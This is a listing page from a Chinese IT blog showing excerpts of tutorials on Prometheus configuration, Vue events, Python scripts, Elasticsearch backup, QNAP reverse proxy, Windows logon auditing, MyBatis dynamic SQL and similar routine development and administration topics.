</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c0f1b50acd3c2c1e6eefa1943527c88/" rel="bookmark">
			Prometheus 配置详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.摘要 Prometheus配置方式有两种： （1）命令行，用来配置不可变命令参数，主要是Prometheus运行参数，比如数据存储位置 （2）配置文件，用来配置Prometheus应用参数，比如数据采集，报警对接
不重启进程配置生效方式也有两种： （1）对进程发送信号SIGHUP （2）HTTP POST请求，需要开启–web.enable-lifecycle选项curl -X POST http://192.168.66.112:9091/-/reload
配置文件格式是yaml格式，说明： .yml或者.yaml 都是 yaml格式的文件， yaml格式的好处: 和json交互比较容易 python/go/java/php 有yaml格式库，方便语言之间解析,并且这种格式存储的信息量很大。
2. 命令行 命令行可用配置可通过prometheus -h来查看。
-h, --help Show context-sensitive help (also try --help-long and --help-man). --version Show application version. --config.file="prometheus.yml" Prometheus configuration file path. --web.listen-address="0.0.0.0:9090" Address to listen on for UI, API, and telemetry. --web.read-timeout=5m Maximum duration before timing out read of the request, and closing idle connections. --web.max-connections=512 Maximum number of simultaneous connections.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c0f1b50acd3c2c1e6eefa1943527c88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/354f89b2ae9a6f06a6b681fe53b87fca/" rel="bookmark">
			在vue中使用event事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		好久都没有写点东西了， 前段时间工作搞得头大，真的就是一起加班到死了。废话不多说，写这篇文章是因为这次因为 event 对象闹了一个乌龙，以此总结一下。
一、event 对象
（一）事件的 event 对象
你说你是搞前端的，那么你肯定就知道事件，知道事件，你就肯定知道 event 对象吧？各种的库、框架多少都有针对 event 对象的处理。比如 jquery，通过它内部进行一定的封装，我们开发的时候，就无需关注 event 对象的部分兼容性问题。最典型的，如果我们要阻止默认事件，在 chrome 等浏览器中，我们可能要写一个：
event.preventDefault();
而在 IE 中，我们则需要写：
event.returnValue = false;
多亏了 jquery ，跨浏览器的实现，我们统一只需要写：
event.preventDefault();
兼容？jquery 内部帮我们搞定了。类似的还有比如阻止事件冒泡以以及事件绑定（addEventListener / attachEvent）等，简单到很多的后端都会使用 $(‘xxx’).bind(…)，这不是我们今天的重点，我们往下看。
（二）vue 中的 event 对象
我们知道，相比于 jquery，vue 的事件绑定可以显得更加直观和便捷，我们只需要在模板上添加一个 v-on 指令（还可以简写为 @），即可完成类似于 $(‘xxx’).bind 的效果，少了一个利用选择器查询元素的操作。我们知道，jquery 中，event 对象会被默认当做实参传入到处理函数中，如下：
$(‘body’).bind(‘click’, function (event) {
console.log(typeof event); // object
});
这里直接就获取到了 event 对象，那么问题来了，vue 中呢？
&lt;div id="app"&gt; &lt;button v-on:click="click"&gt;click me&lt;/button&gt; &lt;/div&gt; ... var app = new Vue({ el: '#app', methods: { click(event) { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/354f89b2ae9a6f06a6b681fe53b87fca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2890c50e21415921614f3a2aa602cf95/" rel="bookmark">
			python实用小脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、提取PDF表格 # 方法① import camelot tables = camelot.read_pdf("tables.pdf") print(tables) tables.export("extracted.csv", f="csv", compress=True) # 方法②, 需要安装Java8 import tabula tabula.read_pdf("tables.pdf", pages="all") tabula.convert_into("table.pdf", "output.csv", output_format="csv", pages="all") 2、获取cpu温度 # 获取CPU温度 from time import sleep from pyspectator.processor import Cpu cpu = Cpu(monitoring_latency=1) with cpu: while True: print(f'Temp: {cpu.temperature} °C') sleep(2) 3、获取机器信息 # 获取计算机信息 import wmi def System_spec(): Pc = wmi.WMI() os_info = Pc.Win32_OperatingSystem()[0] processor = Pc.Win32_Processor()[0] Gpu = Pc.Win32_VideoController()[0] os_name = os_info.Name.encode('utf-8').split(b'|')[0] ram = float(os_info.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2890c50e21415921614f3a2aa602cf95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7deb77140237216d86bd9b4910986807/" rel="bookmark">
			JavaScript中的加法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JS加法问题 先来看一些简单的 + 法：
console.log(1+1); //2 console.log("1"+1); //"11" console.log(NaN + 1); //NaN console.log(NaN + "1"); //"NaN1" console.log(null + 1); //1 console.log(null + "1");//"null1" 分析总结就是：字符串类型和其它数据类型“+”，先把其它数据转为字符串类型，再进行拼接
一些较难理解的 + 法：
console.log([1] + 1); //"11" console.log([1,2] + [1]); //"1,21" console.log([1] + {n:1}); //"1[object Object]" 直接看看不懂，先给出加法运算规则（灰常重要！！！）：
eg：console.log([1,2] + [3,4]) 结果为？
&lt;script&gt; console.log([1,2].valueOf().toString()); //'1,2' console.log([3,4].valueOf().toString()); //'3,4' '1,2' + '3,4' = '1,23,4' &lt;/script&gt; 现在给出例子理解加法运算规则：
eg1：console.log(null + undefined);结果为？
console.log(null + undefined); //结果为 NaN ,为什么呢？ 结果分析：结果为NaN, 依照上面加法运算规则来看，null和undefined都是基本数据类型，其都不是字符串，所以都转为数字类型，null和 undefined转为数字为什么呢？调用Number()函数，看结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7deb77140237216d86bd9b4910986807/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c17014c24d91c27b46002b26b077134/" rel="bookmark">
			爬虫学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.网络协议 1.1http协议：超文本传输协议，是一种发送和接收html页面的方法。（使用明文，不加密，不进行身份验证，可能遭遇伪装。）
1.2 https协议：http安全版，在http下面加入ssl层。（在应用层和传输层之间多了一个安全层，通信被加密，需要验证。）
2.请求 2.1 请求目标：URL
统一的资源定位符，类似于windows的文件路径。
举个例子：response=requests.get('http://www.wjy.la/10/10489/').
http:// 请求的协议类型（http/https)超文本传输协议（图片、网页、音频、视频）
www 服务器的名字（万维网）
wjy.la 域名
/ 服务器的根目录（资源在哪里）
10/10489/ 资源的位置
2.2 请求体 request
（在浏览器中查看请求体的信息：header）
请求告诉服务器这些内容：请求行，请求头部，空行，请求数据。
2.3 请求方法
（1）get请求：一般情况下，只从服务器获取数据，并不会对服务器资源产生任何影响。
（2) post请求：向服务器发送数据（登录）、上传文件等，会对服务器资源产生影响。
2.4 常用的请求报头(header)
header是浏览器给服务器发送的消息，服务器通过这里的消息鉴定我们的身份。
（1）accept :浏览器告诉服务器，自己接受什么类型的数据，文字，图片等。
（2）accept-charset:浏览器申明自己接受的语言。
（3）accept-encoding:浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法。
(4)user-agent:辨别浏览器版本
(5)cookie:为了辨别用户身份，在用户的客户端上保存的数据。
2.5 Network
Network的功能是：记录在当前页面上发生的所有请求。
只有比较老（或比较轻量）的网站，我们用requests和BeautifulSoup就能解决它们，而对于比较复杂的网站，关键信息都是在实时网页的请求中，我们需要找到被隐藏的数据请求，才能继续进行下一步。
json则是另一种组织数据的格式，和html一样，常用来做网络数据传输。
json和XHR之间的关系：XHR用于传输数据，它能传输很多种数据，json是被传输的一种数据格式。
3.beautiful soup
通过 requests 库已经可以抓到网页源码，接下来要从源码中找到并提取数据。Beautiful Soup 是 python 的一个库，其最主要的功能是从网页中抓取数据。Beautiful Soup 目前已经被移植到 bs4 库中，也就是说在导入 Beautiful Soup 时需要先安装 bs4 库。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91227fb59df927323391f734c80132af/" rel="bookmark">
			Reverse proxy in QTS5.x
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 简介修改配置文件使配置文件生效 简介 qnap QTS5.x 中加入了反向代理支持，架构为 Apache，但界面上不支持一些高级的设置，需要手动来修改配置文件。
修改配置文件 配置文件位于/etc/reverseproxy/extra中1
,文件名为 n.conf（n 为一个数字），通过ssh登入服务器后执行：
cd /etc/reverseproxy/extra sudo vim n.conf # change n to the interested number # 例如 ProxyPreserveHost On 使配置文件生效 直接运行: 1
sudo /etc/init.d/reverse_proxy.sh reload 首先确定了是apache，就顺着apache去找配置，发现配置在/etc/config/apache/下
extra 内基本就是自带的一些映射配置
在修改qnap反方向代理时会调用/etc/init.d/reverse_proxy.sh这个脚本
大致流程：
当用户在页面上配置了反向代理规则后，qnap会将用户的规则保存到/etc/config/reverseproxy/reverseproxy.json 中
随后使用/etc/init.d/reverse_proxy.sh 这个脚本来解析json，
这些配置被解析生成为apche 配置，存放于/etc/reverseproxy/extra/下
根据配置会有多个，命名方式为1.conf 2.conf …
然后会调用
/usr/sbin/reverseproxy -k start -f/etc/reverseproxy/reverseproxy.conf 来启动用户自定义规则
/usr/sbin/reverseproxy 是快捷方式，实际指向/usr/local/apache/bin/apache
我们看下reverseproxy.conf最后一行
包含了/etc/reverseproxy/extra/下所有conf文件
至此就将我们的规则运行起来了
经过测试，在页面关闭、启动这个条规则会删除原有规则并重新生成
经过查看sh脚本，发现是在start_proxy 时会删除原有配置，然后根据json解析生成新配置
我不想修改脚本，所以只能绕过，
经过查找，发现在reload_proxy这个方法不会触发删除，只会调用
/usr/sbin/reverseproxy -k graceful -f/etc/reverseproxy/reverseproxy.conf
重新加载配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91227fb59df927323391f734c80132af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80ebc96cc675b19535f34c1468801da9/" rel="bookmark">
			使用香橙派zero2及其他单网口开发板搭建UU加速盒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本方案的初衷： UU加速盒价格昂贵，恰巧官方发布了Openwrt插件，于是想通过教程让更多人利用自己手里的开发板作为盒子使用，一举两得。之前网上没有相关教程，zero2也没有Openwrt固件，于是就写了这篇文章。
P.S.本方案适用于单口树莓派以及其他单口香橙派。至于为什么没有多接口，主要是因为docker在配置多网口开发板时虚拟网卡写法与单口不同。详情查看docker官网。
本方法基于以下操作： 1、香橙派zero2安装docker。
2、香橙派zero2安装openwrt的docker方法。
3、UU加速器openwrt版插件。
环境： 1、香橙派zero2（单网口）（下文简称Oz）
2、官网版Debian系统（自带清华软件源）
3、加速设备：PlayStation5 光驱版
经验分享（此部分非教程，可以不看。）： 错误/未实现思路：
1、使用oz作为主路由，主机连接wifi加速。
未实现原因：Docker内openwrt仅作为旁路由，不识别无线网卡。
2、使用openwrt
未实现原因：无适配固件。
3、加无线网卡使docker识别。
未实现原因：最近出品的无线网卡驱动大多只支持Linux内核5.3一下，官网Debian为5.16 。
成功实现思路：使用Docker搭建Openwrt作为旁路由使用。
实现（教程部分！）： 1.系统配置部分并连接终端（SSH），贴官网链接：
Orange Pi Zero 2 - Wiki-Orange Pi
2.使用网线连接oz与主路由LAN接口。在SSH中输入命令
sudo apt update sudo apt install docker.io 即可安装docker。
安装docker后，先进行网卡混杂：
ip link set eth0 promisc on 然后创建macvlan：（请将[主路由IP]替换为路由器IP。格式一般为192.168.x.1
docker network create -d macvlan --subnet=[主路由IP]/24 --gateway=[主路由IP] -o parent=eth0 macnet 拉取openwrt的docker镜像并运行：（armv8版本，如果非派zero2请使用命令2）
sudo docker run --restart always --name openwrt -d --network macnet --privileged sulinggg/openwrt:armv8 /sbin/init sudo docker run --restart always --name openwrt -d --network macnet --privileged unifreq/openwrt-aarch64:latest 等待输出一串容器id后即为配置成功。接下来进入终端。输入以下命令可以进入openwrt的终端。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80ebc96cc675b19535f34c1468801da9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/749167ef53b9bb1e2866a5f0d1e7529f/" rel="bookmark">
			ElasticSearch 数据备份与恢复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下为背景
Elasticsearch 7.6.2单点，8.3.3单点
Docker 部署
当前使用场景：部分index，数据量较大，需要在跨版本的ES之间进行迁移
一、前提说明 1. Elasticsearch备份2. 备份恢复方案 二、Elasticsearch 环境准备 1.查看Elasticsearch所有版本2.部署2个Elasticsearch单点服务 三、数据备份 1. 增加仓库配置项2. API指令在原始ES集群创建仓库3. API查看原始ES集群里创建的仓库4. API验证原始ES集群备份仓库是否创建成功5. API创建快照备份6. API删除备份 四、数据恢复 1. 必做步骤2. API 恢复备份3. API 确认数据 一、前提说明 1. Elasticsearch备份 通常Elasticsearch备份有几种情况：
大量/全量数据的迁移增量数据的双写或异步准实时/定时同步临时部分数据的导出导入 2. 备份恢复方案 那么与之对应的解决方案有哪些呢？
什么样的方法适合什么样的场景呢？
Elasticsearch 原生自带的备份Snapshot与恢复Restore的功能，能够同步部分index、数据量级可允许GB\TB\PB的场景，原生自带的相对稳定性有保障，离线操作Logstash的管道同步方案，elk这套中我们也有使用到logstash作为一个重要的中间解析环节，我们这边作为数据同步的场景，需要中间对源数据（可来自ES或其他渠道）字段进行转换、处理、新增、删除的场景，还有异步增量同步场景Elasticsearch-dump 它是一款一款开源的 ES 数据迁移工具，node.js 开发的，需要自行从github下载下来部署后使用，可指定index\mapping等，类似于mysqldump，最终是将数据导出为类似insert的语句后写入，适合数据量小的场景其他开源工具：Kettle（是关系型到关系型/非关系型的数据同步，ES仅写入），DataX（比较完备完整的关系型到关系型/非关系型的数据同步组件，ES仅写入），Flinkx（ES可读取和写入），这种通常涉及关系型到非关系型，或者流程复杂需要二次包装的场景再考虑 基于以上说明，本地实验主要采取原生自带的备份snapshot与恢复restore的功能进行数据的迁移测试
二、Elasticsearch 环境准备 1.查看Elasticsearch所有版本 curl https://registry.hub.docker.com/v1/repositories/elasticsearch/tags | tr -d '[\[\]" ]' | tr '}' '\n' | awk -F: -v image='elasticsearch' '{if(NR!=NF &amp;&amp; $3 != ""){printf("%s:%s\n",image,$3)}}' % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 8250 0 8250 0 0 8620 0 --:--:-- --:--:-- --:--:-- 8611 elasticsearch:1 elasticsearch:1-alpine elasticsearch:1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/749167ef53b9bb1e2866a5f0d1e7529f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ad1824bf50f034f483a8944553d0754/" rel="bookmark">
			bug记录：Yolov5使用注意力机制CBAM报错untimeerror: adaptive_avg_pool2d_backward_cuda does not have a deterministi
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用colab跑CBAM注意力机制的时候一直报错
runtimeerror: adaptive_avg_pool2d_backward_cuda does not have a deterministic implementation, but you set 'torch.use_deterministic_algorithms(true)'. you can turn off determinism just for this operation, or you can use the 'warn_only=true' option, if that's acceptable for your application. you can also file an issue at https://github.com/pytorch/pytorch/issues to help us prioritize adding deterministic support for this operation.
改了几天，我发现用pycharm就不报错，可能是池化层的反向传播出现了问题。所以我尝试把torch.use_deterministic_algorithms(False)加到train.py里面，结果就成功了。
加到train.py 的335行scaler.scale(loss).backward()前面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6b0e4dd53bf3970ffb3c32905629acd/" rel="bookmark">
			如何查看 Windows 服务器中的登录事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Windows 中，您可以为操作系统检测到的某些事件启用“审核策略”。一种这样的审计策略是审计服务器上发生的任何登录/注销事件。这可能是记录哪些帐户正在登录您的服务器、何时以及从何处登录的好方法。
本指南将介绍如何启用审核登录事件、查看它们以及创建自定义视图以过滤仅查看登录事件。
启用登录事件审核 所有审核策略都是组策略的一部分，因此可以从本地组策略编辑器中启用或禁用。
首先：打开组策略编辑器。
第二：导航到计算机配置-&gt; Windows 设置-&gt; 安全设置-&gt; 本地策略-&gt; 审核策略。
第三：右键单击“审核登录事件”并选择“属性” 。
第四：选中“成功”和“失败”复选框以启用对成功和失败登录尝试的审核。单击确定。
现在登录审核已启用，任何未来的登录和注销事件都将在事件查看器中进行跟踪。
查看登录事件 要查看现在正在审核的登录事件，您可以从事件查看器中查看它们。
首先：打开事件查看器。
第二：导航到Windows Logs -&gt; Security。
事件查看器的这一部分将列出所有登录和注销事件。选择其中一个事件将在底部的框中​​显示该事件的详细信息。
仅过滤登录事件 要仅查看登录事件列表而不是已检测到的每个安全事件，您可以创建自定义视图。
首先：在事件查看器中，导航回Windows 日志 -&gt; 安全部分。
第二：在右侧栏中选择创建自定义视图...。
第三：单击显示的位置并输入要查看的事件的 ID。或者，您还可以通过在User:文本框中指定用户来按用户名进行过滤。选择确定。
事件 ID 事件类型 4624 登录 4672 特殊登录 4634 注销
第四：为您的视图命名，并选择性地选择一个文件夹来放置它。单击OK。
现在您将能够在自定义视图 -&gt; 您的视图名称下的事件查看器中查看您的过滤器。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cd5cd24198ce808cc5e73e67b5800e7/" rel="bookmark">
			单GDB调试RISC-V CPU 多核时，continue 命令行为解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 背景 前两天软件同事反应在使用单GDB调试我们四核CPU（RISC-V，64位）时，对设置软断点后再continue后的行为不太理解，和以前调试单核CPU的行为不太一致，因此我在ZEBU平台做下复现工作，然后结合行为和波形分析Debug Module。
2 现象 2.1 openocd配置 下面是使用的openocd配置文件。
上面需要注意的是第23行的openocd命令：
target smp $_TARGETNAME_0 $_TARGETNAME_1 $_TARGETNAME_2 $_TARGETNAME_3 查询官方的openocd手册，该命令的行为如下：
1.a set of hardware breakpoint sets the same breakpoint on all targets in the list.
2.halt command triggers the halt of all targets in the list.
3.resume command triggers the write context and the restart of all targets in the list.
4.following a breakpoint: the target stopped by the breakpoint is displayed to the GDB
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cd5cd24198ce808cc5e73e67b5800e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d08e3f70224b9d5360647c5de62798f7/" rel="bookmark">
			Mybatis动态 sql用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是动态SQL？ 根据不同条件拼接 SQL 语句，实现对数据库更准确的操作。
为什么会有动态SQL？ 因为在我们的网页中，很多功能都是不能写死的，先不说会增加我的工作量，更会影响我们代码的效率。
以下列网站的功能为例，那么多查询条件，一个一个写都要写几十条，更别说把他们组合起来做查询了！！！
如何使用动态SQL? 两种方式：
①映射器XML配置文件
②注解
映射器XML配置文件使用动态SQL if：单条件分支判断:&lt; if test ="条件"&gt; 满足条件的语句&lt;/if&gt;
&lt;select id="findoneStudent" resultMap="stu_class_map" parameterType="student"&gt; &lt;!-- 利用反射对象，让resultType知道我们需要的类型Class.forName("com.mysql.cj.jdbc.Driver")--&gt; &lt;!-- parameterType=传入参数的类型 ,有传入参数的时候用--&gt; select * from student where 1=1 &lt;if test="ssex!=null"&gt; and ssex =#{ssex} &lt;!--如果条件成立则将标签包裹的sql语句拼接，不满足则直接忽略，继续往下执行--&gt; &lt;/if&gt; &lt;if test="classid!=0"&gt; and classid=#{classid} &lt;/if&gt; &lt;/select&gt; 使用if if时，因为sql语句的拼接，导致每句sql语句前面都要加个连接关键字and,但是这时候如果第一个条件为空时，直接拼接后面带and的语句，就会出现运行错误。可以在where前面加个恒成立1=1，拼接后面的sql；之后所有的sql语句都要加上and； choose ：多条件分支判断，等 同于 java 的 switch 。
&lt;select id="findonechose" resultMap="stu_class_map" parameterType="student"&gt; &lt;include refid="stu_find"&gt;&lt;/include&gt; where 1=1 &lt;choose&gt; &lt;when test="ssex!=null"&gt; and ssex=#{ssex} &lt;/when&gt; &lt;when test="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d08e3f70224b9d5360647c5de62798f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1408a69637365a2350bd1280a023744/" rel="bookmark">
			适配与视口、分辨率、媒体查询、缩放的学习、消化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		适配与视口、分辨率、媒体查询、缩放 浏览器： 移动端浏览器
内置浏览器：就是手机自带的，更新慢，一般是系统更新才可能更新
可以安装的浏览器：更新快
pc端浏览器
像素 css像素: web开发的最小单元， px
物理像素：屏幕显示的最小颗粒，真实存在的点；
屏幕分辨率：也就是横纵向上的像素点的个数，一般以纵向像素*横向像素
1个css像素1px不一定等于1个物理像素
屏幕尺寸：手机的对角线长度，1英寸=2.54cm
设备独立像素：浏览器中看到的移动设备 像素，是设备提供，用来对接css像素的接口
位图像素：一个栅格图像（png,jpg……）的最小单元；一个位图像素对应一个物理像素，图片才能清晰展示，图片呈现的最小单元
像素比：设备物理像素与设备独立像素的比例（一个方向上占满整个屏幕所需的物理像素的个数/一个方向上占满整个屏幕所需的设备独立像素的个数）简单地理解就是1px所能显示的物理像素个数
当加上meta标签后，width=device-width，那么等同于css像素等于设备独立像素
视口 浏览器显示页面的屏幕区域
视口单位是css像素px，
布局视口：就是整个网页的大小（也就是html的宽高）
在PC端上，布局视口默认就是浏览器窗口的宽度。而在移动端上，由于要使为PC端浏览器设计的网站能够完全显示在移动端的小屏幕里，此时的布局视口会远大于移动设备的屏幕，就会出现滚动条
视觉视口：我们在设备上看到的网页的大小（不是指设备的宽度）
用户看到的网页区域大小；浏览器不压缩，我们通过手动缩小，改变观看的区域，此时，视觉时候就变大了，因为我们看到的网页区域变大了；但是它不会影响布局视口，作用是改变了css像素与物理像素的比
布局视口会限制CSS布局；视觉视口决定用户看到的网站内容
理想视口：不需要缩放，就可以直接看到完整页面，而且与设计一样
布局视口宽度 = 视觉视口宽度 = 设备宽度( = 内容宽度)
手动缩放会改变视觉视口的大小
媒体查询与分辨率、缩放、窗口宽度 作用：
视口的宽度和高度
方向（平板电脑/手机处于横向还是纵向模式）
分辨率
设备的宽度和高度（device-width，后面好像被弃用）
值描述其他width视口宽度max-width显示区域的最大宽度，例如浏览器窗口min-width显示区域的最小宽度，例如浏览器窗口orientation视窗（viewport）的旋转方向（横屏还是竖屏模式）如果浏览器窗口宽小于1920px,就是绿色背景
@media screen and (max-width: 1920px) { body { background-color: green; } } 横屏是背景色为蓝色
@media only screen and (orientation: landscape) { body { background-color: skyblue; } } 显示时为红色字体，打印时为黑色字体
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1408a69637365a2350bd1280a023744/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c22bfcc14912bb09b71e3cdd5a2a7710/" rel="bookmark">
			JS基础知识点合集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.js的输出 *使用windows.alert() 写入警告框
*使用document.write() 写入HTML输出
*使用innerHTML 写入元素、更改HTML元素的常用方法
如需访问HTML元素，js应使用document.getElementById(id)方法，id属性定义HTML元素
*使用console.log（） 写入浏览器控制台
2.js语句 构成：值；运算符；表达式；关键字；注释
分号分隔语句，有分号分割的前提下允许一行写多条语句
js关键字：
break 终止 switch 或循环。
continue 跳出循环并在顶端开始。
debugger 停止执行 JavaScript，并调用调试函数（如果可用）。
do ... while 执行语句块，并在条件为真时重复代码块。
for 标记需被执行的语句块，只要条件为真。
function 声明函数。
if ... else 标记需被执行的语句块，根据某个条件。
return 退出函数。
switch 标记需被执行的语句块，根据不同的情况。
try ... catch 对语句块实现错误处理。
var 声明变量。
3.js语法 js值：分为变量值和混合值
js变量：var声明变量 =号 用于变量赋值
js运算符：+ - * /
js表达式：由值、变量 和 运算符 组合，计算结果为值
js注释：单行：// 多行（文档）：/* */
js标识符：即名称
**js对大小写敏感
**驼峰式命名不能用连字符，连字符是为减法预留的
##let 1.提供块作用域（变量、常量）的两个关键字 let 和 const
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c22bfcc14912bb09b71e3cdd5a2a7710/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/129/">«</a>
	<span class="pagination__item pagination__item--current">130/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/131/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>